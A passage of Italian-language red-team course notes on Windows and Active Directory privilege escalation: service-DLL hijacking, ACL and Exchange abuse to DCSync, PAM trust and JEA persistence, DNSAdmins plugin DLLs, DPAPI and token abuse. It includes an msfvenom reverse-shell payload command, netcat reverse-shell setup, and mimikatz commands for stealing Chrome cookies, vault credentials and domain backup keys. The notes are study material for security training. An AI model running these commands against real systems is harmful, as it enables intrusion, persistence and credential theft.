Inoltre, il fatto che il servizio sia configurato per essere avviato manualmente, lo rende un target ideale.  
![image](https://user-images.githubusercontent.com/110602224/200362028-006385ea-85d4-4c4b-b2ed-5fb88ce2ac92.png)

In questo caso il servizio è lanciato da _svchost.exe_ e ci sono molte DLL usati dai servizi di Windows che sono identificate come _WIN32\_SHARE\_PROCESS_.  
![image](https://user-images.githubusercontent.com/110602224/200362425-8c75d673-0749-4eb7-84e7-574b13f8ba5b.png)

Interrogando il registro di sistema si possono individuare informazioni utili sui servizi, ad esempio quale DLL è usata dal servzio e la ServiceMain function invocata da svchost.exe  
![image](https://user-images.githubusercontent.com/110602224/200362828-70f97e6c-7fe1-4bcc-8db2-2b0812973741.png)

La repository [BadBackupOperator](https://github.com/decoder-it/BadBackupOperator) contiene tutti gli strumenti necessari per eseguire l'attacco.  
**Servicedll** è una .dll ridotta all'osso che esegue il file "C:\temp\rev.bat" di default quando la SysMain Function viene invocata.  
Deve essere posizionata al percorso "C:\temp\servicedll.dll" e come funzione aggiuntiva compila un file log.txt allo stesso percorso.  
**SuBackup** sfrutta i privilegi dei Backup Operators per copiare il file servicedll.dll da "C:\temp" in "C:\Windows\System32" e modifica la chiave di registro HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice\Parameters. Questo serve per eseguire la DLL copiata al posto di quella originale.  

All'interno del file rev.bat si può inserire il seguente codice per ottenere una reverse shell via netcat come SYSTEM (aggiornare i valori come gli indirizzi IP).  
![image](https://user-images.githubusercontent.com/110602224/200364753-f996a5f5-e6bb-49e8-b338-04a6a61e4c5b.png)
Avviare il processo: **net start dmwappushservice**


13. **ACLs in Active Directory**  
Effettuare con successo una Privilege Escalation in Active Directory diventa sempre più difficile in quanto il tema della sicurezza informatica cresce ogni giorno di importanza.  La fase di recoinnassance e di enumeration diventa allo stesso tempo sempre più importante per individuare il punto debole da sfruttare e per affinare l'attacco.  
Le ACL, in AD, si possono applicare agli utenti, ai gruppi, agli account computer e alle OU. Quando applicate alle Organizational Unit, ogni membro ne eredita la configurazione.  
All'interno delle OU si possono inserire gruppi di sicurezza con utenti che ereditano le configurazioni delle Access Control Entry che formano le ACL.  
I gruppi possono contenere altri gruppi e l'ereditarietà delle ACL prosegue la discesa fino ai gruppi più nascosti in questa gerarchia a matrioska.  

Questa scala "infinita" può contribuire alla presenza di errori nella configurazione, specialmente per gruppi o utenti poco usati o controllati.  

**Escalating Privileges using Exchange**  
Al momento della sua installazione, Micrsoft Exchange crea in automatico diversi gruppi tra cui il gruppo _Organization Management_.  
I membri del gruppo hanno accesso a configurazioni relative ad Exchange e permessi sufficienti per modificare l'appartenenza di utenti/gruppi ad altri gruppi di sicurezza come _Exchange Trusted Subsystem_ (che fa parte del gruppo _Exchange Windows Permissions_).  
L'installazione di default attribuisce al gruppo di sicurezza _Exchange Windows Permissions_ il permesso _writeDACL_ sugli oggetti di dominio in cui è installato Exchange.  
Sfruttare questo permesso può portare una privilege escalation dal gruppo _Organizational Management_ a _Domain Administrators_.  

Per raggiungere questo obiettivo bisogna aggiungere un utente compromesso (dal gruppo _Organizational Management_) al gruppo _Exchange Trusted Subsystem_ che fa parte del gruppo di sicurezza _Exchange Windows Permissions_.  
A questo punto si possono modificare i permessi sugli oggetti e modificare password o ottenere diritti per replicare le impostazioni di dominio, compromettere gli account o il gruppo _Domain Adminisrators_ o riuscire ad ottenere permessi per un DCSync.  

Comando per aggiungere un utente dal gruppo _Organization Management_ al gruppo _Exchange Windows Permissions_ via Set-ACL o con console DSA.  
![image](https://user-images.githubusercontent.com/110602224/200368927-01544bb4-e73a-43e3-922b-4e033bb65446.png)

Effettuare un logout e poi un nuovo login per ottenere un nuovo token aggiornato alla modifica di cui poco sopra.  
Comando per assegnare all'utente permessi _DS-Replication-Get-Changes_ e _DS-Replication-Get-Changes-All_.  
![image](https://user-images.githubusercontent.com/110602224/200369361-ef9a9ede-def7-4774-9add-4d0828a80e59.png)

L'assegnazione dei permessi è infine facilitata da PowerView usando il comando **Add-DomainObjectAcl** con flag **-Rights DCSync**.  

Anche per gli utenti con permessi definiti dal ruolo RBAC possono configurare i permessi _DS_Replication-Get-Changes_ e _DS-Replication-Get-Changes-All_ per eseguire poi DCSync.  
![image](https://user-images.githubusercontent.com/110602224/200540420-8814144c-5281-4d38-bb74-bedd2745c602.png)

**Invoke-ACLPwn**  
Il tool/modulo [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) automatizza il procedimento di identificazione delle ACL con problemi di configurazione e cerca di sfruttarle restituendo all'utente un catena di azioni per una privilege escalation.  
Opera sotto [Sharphound](https://github.com/BloodHoundAD/SharpHound) ed esporta tutte le ACL e appartenenze ai gruppi nel dominio dal punto di vista dell'utente dal quale è eseguito il tool.  
Nel caso in cui l'utente non disponga dei permessi writeDACL sull'oggetto di dominio, il tool enumera in maniera ricorsiva tutte le ACE e le ACL nel dominio.  
Una volta conclusa l'enumerazione il tool tenta una privilege escalation seguendo gli step:  
- l'utente è aggiunto ai gruppi necessari per la PE  
- aggiunta all'ACL sull'oggetto i permessi _Add Replicating Directory Changes_  
- aggiunta all'ACL sull'oggetto i permessi _Add Replicating Directory Changes All_  
- se il percorso a mimikatz.exe è passato come argomento, viene eseguito un tentativo di DCSync  
- Ripristino dell'appartenenza ai gruppi una volta terminato l'attacco  
![image](https://user-images.githubusercontent.com/110602224/200543547-36f5ba65-b2fa-4344-bec9-08341140e8e9.png)

**NTLMRelayx**  
Il mini-tool [NTLMRelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) di Impacket è in grado di richiedere le ACL di oggetti di dominio (importanti), enumerare i permessi in modo da eseguire una privilege escalation di nuovi utenti o già esistenti.  
Questo attacco si può eseguire partendo da un ACL Attack in cui l'ACL dell'oggetto di dominio è modificata e all'utente (o utenti) compromessi dall'hacker sono concessi permessi come _DS-Replication-Get-Changes-All_  per arrivare a un DCSync.  
In alternativa è anche possibile aggiungere utenti compromessi a gruppi con privilegi elevati come Backup Operators, Enterprise Admins, Domain Admins, Account Operators.  

![image](https://user-images.githubusercontent.com/110602224/200549518-28979714-baa0-4581-85d2-6e15b633785f.png)
![image](https://user-images.githubusercontent.com/110602224/200549615-0aa43d96-019c-46fa-8220-89b3d4b56b89.png)

Link: https://github.com/dirkjanm/mitm6
![image](https://user-images.githubusercontent.com/110602224/200549796-71ee26c5-585f-4a79-9e80-2e66a21488cf.png)

![image](https://user-images.githubusercontent.com/110602224/200549939-86d1f2c6-4d16-4836-8b8c-b77dafc3c161.png)


14. **Abusing Privileged Access Management (PAM)**  
Con Windows Server 2016 si è introdotto un supporto molto profondo per la soluzione [PAM](https://learn.microsoft.com/it-it/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services).  
In particolare, Active Directory per Windows Server 2016 introduce alcune novità rispetto a precedenti integrazioni di questa soluzione:  
- **Temporary Group Membership**: gli utenti possono essere aggiunti a gruppi specifici per una data durata temporale. Questa membership è fatta scadere dallo stesso Active Directory invalidando i ticket Kerberos.  
- **Shadow Security Principals**: sono oggetti che rappresentano utenti, gruppi o account computer da un'altra foresta. Affinchè questi oggetti possano accedere a una risorsa, deve prima esistere una relazione trust basata sulla soluzione PAM. Queste relazioni sono un'estensione del trust tra Foreste e il livello minimo di Active Directory in uso deve essere Windows Server 2012 R2 aggiornato con un [hotfix](https://support.microsoft.com/en-us/topic/you-can-t-use-the-active-directory-shadow-principal-groups-feature-for-groups-that-are-always-filtered-out-in-windows-fb2dc647-57e2-7d29-a893-d8482eb19a74) o versione superiore.  

Entrambe le funzioni richiedono un livello funzionale della foresta pari a Windows 2016 o superiore e "Privileged Access Management" deve essere attivo.  

Esempio.
La foresta admins.local deve avere accesso alla foresta users.local per gestirne gli utenti.  
Serve una relazione trust "one-way" con la foresta admins.local.  

Lo scopo è di gestire gli utenti:
- senza creare gruppi o modificare permessi per gli utenti della foresta users.local. Il Domain Trust risolve il problema del gruppo Domain Admins che non accetta utenti o gruppi di altri domini come membri del gruppo.  
- senza esporre le credenziali degli utenti della foresta admins.local agli utenti nella foresta users.local a causa di logon interattivi. Il trust PAM in parte risolve il problema.  
- facendo uso membership temporanee ai gruppi al fine di limitare al minimo il tempo di accesso alle risorse e ai permessi necessari.  

Il problema principale risiede nel garantire alla foresta admins.local i permessi alle risorse della foresta users.local, scenario che si ottiene inserendo il SID dei Domain Admins nel token degli Admin.  
La coppia _Shadow Security Principals_ + _Trust PAM_ costituisce la soluzione per ottenere quanto sopra senza problemi.  
Il Trust PAM deve fare uso di altre due configurazioni (aggiuntive) a parte quelle predefinite: 
- _EnabledSIDHistory_ per consentire tokens provenienti da admins.local con SID della foresta users.local  
- _EnablePIMTrust_ per consentire SID da gruppi con privilegi elevati come Domain Admins  

La praticità e la comodità che offre questa soluzione agli amministratori puà essere sfruttata per compromettere un'altra foresta se quella di partenza è già compromessa, questo è possibile replicando l'attacco al [link](https://adsecurity.org/?p=1772) usando un SID qualsiasi.  
Il comando Powershell di seguito è utile per enumerare le proprietà del Trust: **Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}**  
Un altro modo per individuare i Trust PAM e le prorietà è col comando: **Get-AdObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter \* -Properties \* | select Name,member,msDs-Shadow-PrincipalSID**  
Se la foresta è gestita da un'altra foresta, si può enumerare usando Powershell per Active Directory, comando: **Get-ADTrust -Filter {(ForestTransitive -eq $True)}**  

![image](https://user-images.githubusercontent.com/110602224/200601002-19edbb44-36b0-4a37-97e5-105567ef2622.png)
![image](https://user-images.githubusercontent.com/110602224/200601810-97c91045-6ba2-45a0-8637-48689aa3541d.png)
![image](https://user-images.githubusercontent.com/110602224/200602003-e2dd691c-6a13-4875-b3dc-e4d33e8fde63.png)


15. **Just Enough Administration (JEA)**  
JEA è una Security Feature di Powershellv5 che permette di delegare l'amministrazione per qualsiasi aspetto gestibile tramite Powershell.  

JEA è utile:  
- nel ridurre il numero di amministratori: usa account virtuali o service account gestiti da gruppi per eseguire azioni con privilegi elevati per conto di utenti con privlegi standard  
- per limitare quanto possono fare gli utenti specificando quali cmdlets, funzioni e funzioni esterne si possono eseguire via Powershell. Concetto di LeastPrivilege forzato con modalità NoLanguage per la sessione JEA  
- per raccogliere in maniera organizzata log e trascrizioni di quanto fatto dagli utenti (input, output...)  

Quando si crea un endpoint JEA è obbligatorio definire ruoli e capacità per identificare appunto quali cmdlets, funzioni e così via sono accessibili.  
Queste configurazioni sono memorizzate in file con estensione .psrc e .pssc.
Comando: **New-PSRoleCapabilityFile -Path .\[FILE].psrc**  
Comando: **New-PSSessionConfigurationFile -SessionType RestrictedRemoteServer -Path .\[FILE].pssc**  

Il flag _-SessionType RestrictedRemoteServer_ attiva la modalità _NoLanguage_ la quale limita i comandi predefiniti ai seguenti:  
- Clear-Host (cls, clear)  
- Exit-PSSession (exitsn, exit)  
- Get-Command (gcm)  
- Get-FormatData  
- Get-Help  
- Measure-Object (measure)  
- Out-Default  
- Select-Object (select)  

Successivamente, il file di configurazione deve essere registrato: **Register-PSSessionConfiguration -Path [FILE].pssc -Name [NAME] Force**  
![image](https://user-images.githubusercontent.com/110602224/200607768-f54d4980-b599-47ea-91db-598bba3dba9e.png)

**Abusing Just Enough Administration (JEA)**  
Nei file di configurazione JEA è ammesso l'uso del carattere "\*" come wildcard, introducendo un elemnto di rischio in quanto concedere un comando come "Start-\*" rende disponibile una serie di comandi che iniziano appunto con "Start-\*".  
Hacker con accesso amminisratore su una macchina possono creare endpoint JEA estendo l'uso di comandi a utenti compromessi riuscendo anche ad eliminare successivamente i log e le trascrizioni. Usare account standard, quindi potenzialmente poco controllati, ma con accesso libero a privilegi elevati è un modo per rimanere al di sotto dei radar (persistence).  

Il tool [RACE](https://github.com/samratashok/RACE) permette di automatizzare la permanenza (persistence) via JEA: **Set-JEAPermissions -ComputerName [TARGET] -SamAccountName [USER] -Verbose**  
Connessione al computer target: **Enter-PSSession -ComputerName [TARGET] -ConfigurationName microsoft.powershell64**  


16. **DNSAdmins**  
Rendere il Domain Controller anche il Server DNS per integrazione tra i servizi ha come controindicazione quella di aumentare la superficie di attacco sullo stesso DC esponendo il protocollo DNS e il protocollo di gestione (basato su RPC) a ogni utente autenticato al dominio.  

Su [RPC](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) funziona il Protocollo di Gestione del Server DNS (UUID=50ABC2A4-574D-40B3-9D66-EE4FD5FBA076). Questo protocollo può anche funzionare su TCP o [Named Pipes](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes) (\PIPE\DNSSERVER).  
All'interfaccia di gestione si può accedere avviando _dnsmgmt.msc_ e connettersi al Domain Controller o al Server DNS nel caso che non sia in esecuzione la configurazione standard, ovvero DNS integrato in Active Directory.  

Le zonde DNS, lookups caching, forwarding e logging possono essere configurati dall'interfaccia di gestione.  
![image](https://user-images.githubusercontent.com/110602224/200671620-05fcf06e-95b5-42bb-9057-cf58f40ed92c.png)

![image](https://user-images.githubusercontent.com/110602224/200672199-0b059060-4250-46e4-bd59-98b2d4b7e7d4.png)

**Privilege Escalation using DNSAdmins**  
Il permesso di Write Access sul server DNS è concesso di default a _DnsAdmins,Domain Admins, Enterprise Domain Controllers, Enterprise Admins, Administrators_.  

Link: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a
![image](https://user-images.githubusercontent.com/110602224/200673788-6069f81d-5b12-4791-a194-0b69738f911c.png)

In una macchina con in uso un utente parte del gruppo DNSAdmins in grado di installare ruoli o feature si installa il tool _dnscmd.exe_.  
![image](https://user-images.githubusercontent.com/110602224/200674871-2de22750-38a9-4271-bc2c-20b31030295b.png)

È anche possibile una semplice DLL creata usando msfvenom ma questo approccio rischia di generare alert e in generale di essere meno discreto.  
Comando: **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] --smallest -f dll --encrypt rc4 --encrypt-key "[STRINGA DI TESTO]" -o [NOME DLL].dll**  
Usando lo script smbserver.py si rende disponibile in rete la DLL. Assicurarsi che nel Controller di Dominio sia attivo [Insecure Guest Logons](https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default) altrimenti il servizio smette di funzionare.  
![image](https://user-images.githubusercontent.com/110602224/200790059-737956aa-976b-4464-a034-cd3656223bae.png)

Dal server compromesso eseguire i senguenti comandi:  
![image](https://user-images.githubusercontent.com/110602224/200790364-af2a705f-9d59-4eb5-8ff6-e7615a1a8335.png)

Se l'utente nel gruppo DNSAdmin ha i permessi per effettuare il login nel Controller di Dominio o se si ha attiva una sessione meterpreter con membro del gruppo DNSAdmin, si può tentare una privilege escalation usando lo script [dnsadmin_serverlevelplugindll.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/dnsadmin_serverlevelplugindll.rb).  
Procedere copiano il modulo in /modules/exploits/windows/local/dnsadmin_serverlevelplugin.rb.  

Una volta eseguito, lo script procede alla creazione della DLL con il payload selezionato, modifica il percorso alla chiave ServerLevelPluginDll e riavvia il server.  
Ricordarsi di eliminare la chiave di registro creata durante il processo quando viene inizializzata la nuova sessione meterpreter come utente SYSTEM.  
![image](https://user-images.githubusercontent.com/110602224/200797044-840d1a86-5023-4f92-9430-17e439f84a2c.png)
![image](https://user-images.githubusercontent.com/110602224/200797100-6fbf0dc6-fdb4-4490-9169-891763f8a007.png)


17. **DPAPI Abuse**  
[DPAPI](https://learn.microsoft.com/en-gb/windows/win32/api/dpapi/) fu introdotto da Microsoft in Windows 2000 come parte di CryptoAPI per fornire funzioni di crittografia per gli sviluppatori con scarse conoscenze nell'uso della crittografia, appunto.  
DPAPI può usare le credenziali di accesso dell'utente in uso o la password dell'account computer per proteggere la MasterKey che genererà una chiave di sessione il cui scopo è la protezioni dei blob (Binary Large Object) di dati passati alle funzioni DPAPI.  

Le principali funzioni di DPAPI sono:  
- **CryptProtectData**: crittografia dei dati in una struttura DATA_BLOB  
- **CryptUnprotectData**: decrittografia e verifica di coerenza dei dati in una struttura DATA_BLOB  
- **CryptProtectMemory**: crittografia della memoria per impedire ad terzi di vedere le informazioni in uso nel/dal processo  
- **CryptUnprotectMemory**: operazione inversa al punto sopra  
- **CryptUpdateProtectedState**: migra la MasterKey dell'utente corrente quando cambia il SID  

Secondo l'articolo [link](https://web.archive.org/web/20200322181208/https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage-dpapi-edition/) è possibile specifcare che DPAPI utilizzi l'account computer/macchina per derivare la chiave di crittografia e non le credenziali dell'utente. Utile per avere "persistence" per più utenti dell'host.  
![image](https://user-images.githubusercontent.com/110602224/200800688-0dc50bc7-afea-4c9b-b81c-55521a54909e.png)

Le funzioni di DPAPI permettono agli sviluppatori di proteggere i dati degli utenti senza preoccuparsi della gestione delle chiavi di crittografia.  
Alcuni software interessanti che utilizzano DPAPI:  
- Remote Desktop Connection Manager = .rdg
- Archivio credenziali di Windows = credenziali di Edge, condivisioni di rete, RDP...
- Google Chrome = cookies e dati di login

Nel caso in cui DPAPI usi le credenziali dell'utente per generare la chiave, questa sarà univoca e salvata nel percorso: %APPDATA%\Microsoft\Protect\[SID]\[GUID]  
![image](https://user-images.githubusercontent.com/110602224/200801681-913294f1-57fb-42ce-982f-cc42ba139daf.png)  

Gli utenti possono avere più di una MasterKey e possono essere decriptate usando la password di login dell'utente o la chiave di backup del Dominio.  
Questa chiave esiste nel caso in cui l'utente reimposti la password e la MasterKey originale non è più accessibile.  
La procedura di recupero della chiave:  
- La workstation invia la MasterKey di backup criptata al Controller di Dominio via RPC  
- La MasterKey è decriptata dal Controller di Dominio usando la chiave privata  
- La MasterKey decriptata è inviata alla workstation  
- La MasterKey è criptata nuovamente dalla workstation usando la nuova password  

Esistono diversi metodi per entrare in possesso della MasterKey di un utente.  

**Chrome**  
Chrome si affida a DPAPI per memorizzare cookie e informazioni sui login salvati.  
I percorsi predefiniti sono:  
- **Login Data**: %localappdata%\Google\Chrome\UserData\Default\LoginData  
- **Cookies**: %localappdata%\Google\Chrome\UserData\Default\Cookies > database SQLite con i valori dei cookie  

Gli scenari in cui è possibile estrarre informazioni da cookie e sui login:  
1) esecuzione di codice nel contesto dell'utente vittima  
2) accesso con privilegi amministratore in un computer dove l'utente vittima è già loggato  
3) accesso con privilegi amministratore in un computer dove l'utente vittima NON è ancora loggato  
4) accesso elevato di Dominio  

1) Usando mimikatz con flag _/unprotect_ al comando dpapi che invoca la funzione CryptUnprotectDataAPI.  
Comando: **[mimikatz] dpapi::chrome /in %localappdata%\Google1\Chrome\UserData\Default\Cookie /unprotect**
![image](https://user-images.githubusercontent.com/110602224/200806844-15fe190c-5c4b-4dd7-b560-334c5f83ba7f.png)

2) Usando mimikatz per ottenere la MasterKey usando i comani **sekurlsa::dpapi** o **sekurlsa::msv**.  
Successivamente il comando (sempre in mimikatz) per decriptare: **dpapi::chrome /in:"[CHROME PATH]" /masterkey:"[MASTERKEY]"**
![image](https://user-images.githubusercontent.com/110602224/200808324-e570dbfa-bc3b-460d-a622-7b6a3eb5d152.png)

3) Se l'utente target non è loggato è necessario essere in possesso della password NTLM o della sua hash.  
Comando se si ha la password in chiaro: **dpapi::masterkey /in:[MASTERKEY LOCATION] /sid:[USER SID] /password:[PASSWORD] /protected**  
Se se in è in possesso dell'hash è necessario usare il MS-BKRP(BackupKey Remote Protocol) per recuperare la chiave.  
A tal fine bisogna eseguire un attacco _Pass-the-Hash_ per creare un nuovo processo nel contesto dell'utente.  
![image](https://user-images.githubusercontent.com/110602224/200809310-7aa772b2-d895-4984-9b9d-5b2eea8bdf91.png)

Una volta che il processo è creato si usa il comando seguente per recuperare la MasterKey: **dpapi::masterkey /in:[MASTERKEY] /rpc**  
Successivamente per decriptare: **dpapi::chrome /in:[CHROME PATH]**  
![image](https://user-images.githubusercontent.com/110602224/200810270-c11a022a-38a6-4966-896a-7ebe83e5e3bc.png)

4) Avere modo di effettuare un accesso con privilegi elevati al Dominio da la possibilità di potere eseguire un DCSync sull'utente vittima, di ottenere l'hash della password e di ripetere il punto 3.  
È anche vero che, come descritto sopra, nel Dominio è presente una chiave di backup, immutabile, valida per tutti i client del Dominio, che si usa per recuperare le MasterKey.  
Comando per estrarla: **lsadump::backupkeys /system:[DOMAIN CONTROLLER] /export**  
![image](https://user-images.githubusercontent.com/110602224/200811473-180306cc-6076-4b53-82fc-7de1613d0739.png)

Comando per decriptare la MasterKey dell'utente target: **dpapi::masterkey /in:"[USER MASTERKEY]" /pvk::[DOMAIN BACKUP KEY]**  
![image](https://user-images.githubusercontent.com/110602224/200811965-e9a45fe7-4d0c-47fc-911b-72472ef34df7.png)

Comando per decriptare i cookie: **dpapi::chrome /masterkey:"[USER MASTERKEY]" /in:"[PATH TO CHROME COOKIES]"**
![image](https://user-images.githubusercontent.com/110602224/200812285-93ace8ba-01af-41f8-a106-49a6039a5a5e.png)

**Credential Manager and Windows Vaults**  
Da Windows 7 in poi, Microsoft introdusse il Gestore delle Credenziali per memorizzare credenziali per risorse di rete e siti web.  
I file delle credenziali sono salvati al percorso "C:\Users\[NOME UTENTE]\AppData\Local\Microsoft\Credentials" o "%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials".  

Le password vaults sono memorizzate al percorso "C:\Users\[NOME UTENTE]\AppData\Local\Microsoft\Vault\[VAULT_GUID]\" e contengono un file .vpol con due chiavi AES all'interno protette dalla MasterKey DPAPI.  
Queste due chiavi sono usate per decriptare le credenziali nel file .vcrd (presente nella stessa cartella).  

Il comando **vault::list** tenta di decriptare le credenziali presenti al percorso "\AppData\Local\Microsoft\Vault".  
![image](https://user-images.githubusercontent.com/110602224/200853693-892d3d39-7c2f-412f-8b95-e70b42ed8321.png)

Il comando **vault:cred** tenta di decriptare le credenziali presenti al percorso "\AppData\Local\Microsoft\Credentials".  
Volendo si può aggiungere il flag _/patch_ per trasformare in plaint-text le password interpretando la logica LSASS ma è un'operazione rischiosa.  
![image](https://user-images.githubusercontent.com/110602224/200854302-737a999b-ec9c-4d2e-879b-d120ff8d728e.png)

Se la password dell'utente è nota si può decriptare col comando **dpapi::masterkey /in:[USER KEY] /sid:[USER SID] /password:[PASSWORD] /protected**  
![image](https://user-images.githubusercontent.com/110602224/200856602-9ec13d7a-048e-464d-a2ff-cb443c8bd616.png)

Se non si conosce la password ma si può eseguire del codice nel contesto dell'utente si può decriptare la MasterKey col comano:  
**dpapi::masterkey /in:%appdata%\Microsoft\Protect\[SID]\[MASTER KEY GUID] /rpc**  
![image](https://user-images.githubusercontent.com/110602224/200857233-ae766623-1af0-411b-b34d-0ecedb102136.png)

A questo punto si può usare il comando: **dpapi::creds /in:[CREDENTIALS] /masterkey:[MASTERKEY] /unprotect** per estrarre le password in plaintext.  

LE TECNICHE PER SFRUTTARE DPAPI SI BASANO SULLO STESSO SCHEMA DEI PASSAGGI INDICATI QUI SOPRA PER CHROME E IL GESTORE DI CREDENZIALI DI WINDOWS.  


18. **Token Abuses**  
I token di accesso (access tokens) sono usati per determinate le ownership dei processi di Windows. 
Questi token si possono manipolare al fine fare apparire che i processi abbiano un proprietario diverso dall'utente che li ha avviati ereditando il contesto di sicurezza del nuovo token.  
Questa funzionalità esiste per motivi di sicurezza, ad esempio un amministratore che logga come utente standard ma deve eseguire alcune operazioni come un utente con privilegi diversi ([runas.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490994(v=technet.10)?redirectedfrom=MSDN)).  

Gli Access Tokens sono oggetti che descrivono il contesto di sicurezza di processi e threads.  
Questi token si generano quando l'utente logga nel sistema e contiene identità e privilegi dell'utente associato.  
Ogni processo che viene eseguito ha una copia del token che include, come scritto sopra, informazioni relative all'identità e privilegi dell'utente.  

I token sono usati da Windows per identificare gli utenti quando un thread interagisce con [securable onjects](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects) o sono eseguiti task che richiedono determinati privilegi.  
Gli access token contengono le seguenti informazioni:  
- SID dell'account utente
- SID dei gruppi di cui l'utente è membro  
- [Logon SID](https://learn.microsoft.com/it-it/windows/win32/secgloss/l-gly) che identifica la [logon session](https://learn.microsoft.com/it-it/windows/win32/secgloss/l-gly)
- lista di privilegi sia assegnati direttamente all'utente o ereditati dal gruppo di appartenenza
- un SID proprietario  
- SID del gruppo principale
- [DACL](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) predefinita usata dal sistema quando l'utente crea un securable object senza speificare un [security descriptor](https://learn.microsoft.com/it-it/windows/win32/secgloss/s-gly)
- sorgente dell'Access Token
- se il token è un token principale ([primary token](https://learn.microsoft.com/it-it/windows/win32/secgloss/p-gly)) o di impersonation ([impersonation token](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation))
- una lista di [restricting SID](https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens)  
- levelli di impersonation correnti

Da default il primary token associato con ogni processo è usato quando un thread interagisce con un securable object.  
Quando un thread deve impersonare un altro account per interagire con un secrable objects in un contesto di sicurezza differente, questo thread mantiene un primary token e un impersonation token.  

I due token si distinguono per il valore [TOKEN_TYPE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type).  
![image](https://user-images.githubusercontent.com/110602224/200870883-bf0c65c2-1614-46e5-85ca-276c15299dc9.png)

Il valore [SECURITY IMPERSONATION LEVEL](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level) contenuto anch'esso nell'access token specifica i livelli di sicurezza per l'impersonation.  

Le costanti sono:  
- **SecurityAnonymous**: il processo server non può ottenere informazioni d'identificazione del processo client e non può impersonarlo
- **SecurityIdentification**: il processo server può ottenere informazioni sul processo client, come identificatori di sicurezza e privilegi, ma non può impersonarlo  
- **SecurityImpersonation**: il processo server può impersonare il contesto di sicurezza del client nel suo sistema locale  
- **SecurityDelegation**: il processo server può impersonare il contesto di sicurezza del client in sistemi remoti  

Per gli utenti che appartegono al gruppo prdefinito _Administrators_ Windows crea due token: _Filtered_ ed _Elevated_.  
Filtered Tokens signifca che il processo è eeguito con integrità media, con privilegi amministrativi del gruppo Administrator e il SID rimosso.
Per eseguire direttamente operazioni, il permesso deve essere concesso via UAC o inserendo le credenziali per ottenere un Elevated Token.  

Un nuovo access token si puà ottenere duplicando un token esistente da un processo.  
Il token è poi usato per permettere al calling thread di impersonare il contesto di sicurezza del processo target.  
Il token può anche essere assegnato a un thread nel caso l'utente target una sessione di logon del sistema non di rete.  

Questa tecnica si basa sul funzionamento delle seguenti API di Windows:  
- **[LookupPrivilege](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea)**: recupera il [LUID](https://learn.microsoft.com/it-it/windows/win32/secgloss/l-gly) usato localmente al sistema per rappresentare il nome del privilegio specificato  
- **[AdjustTokenPrivilege](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)**: questa funzione attiva o disattiva privilegi nel access token specificato  
- **[PrivilegeCheck](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-privilegecheck)**: questa funzione determina se un set di privilegi specificato è attivo nell'access token  
- **[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)**: apre un oggetto processo localeesistente
- **[OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)**: apre l'access token associato a un processo
- **[DuplicateToken](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken)**: crea un nuovo access toke duplicato
- **[SetThreadToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadtoken)**: assegna un impersonation token 1a un thread

Link: https://pinvoke.net/
![image](https://user-images.githubusercontent.com/110602224/200878127-c27ac0b2-3b55-422e-8b6f-38f0f169e496.png)
![image](https://user-images.githubusercontent.com/110602224/200878198-231cecbc-6b2d-43be-a954-b1d36c52fd65.png)
![image](https://user-images.githubusercontent.com/110602224/200878305-dc71b750-58ea-42e4-8966-12fe5eb1498e.png)

Link:https://learn.microsoft.com/en-us/dotnet/api/system.security.principal.windowsidentity?view=dotnet-plat-ext-3.1
![image](https://user-images.githubusercontent.com/110602224/200878501-374d8b7e-f2d8-45a9-8ec8-f0dbf1ec979a.png)
![image](https://user-images.githubusercontent.com/110602224/200878580-a28fd2c9-dcff-425a-809d-d6faa11b8f4f.png)
![image](https://user-images.githubusercontent.com/110602224/200878662-33990c2d-3368-4499-86de-81707a91c5c9.png)
![image](https://user-images.githubusercontent.com/110602224/200878765-f304074b-5d9c-45fd-8b38-7f1f41855870.png)
![image](https://user-images.githubusercontent.com/110602224/200878851-4fa80d11-754f-4b67-b6a9-13ead74e9dc9.png)
![image](https://user-images.githubusercontent.com/110602224/200878952-08ce4409-69c6-46d7-90c8-ae53c7fae6b8.png)
![image](https://user-images.githubusercontent.com/110602224/200879040-31d480f4-47ea-40fe-8f79-38fe82014571.png)

Link: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
![image](https://user-images.githubusercontent.com/110602224/200879236-c4e30975-858d-4cf6-9f85-2a15be815e21.png)


**Create Process with a Token**  
[slide514]
La creazione di processo con token è simile alla tecnica _Token Impersonation/Theft_ anche se in questo caso viene creato proprio un nuovo processo con l'access token.  

Link1: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
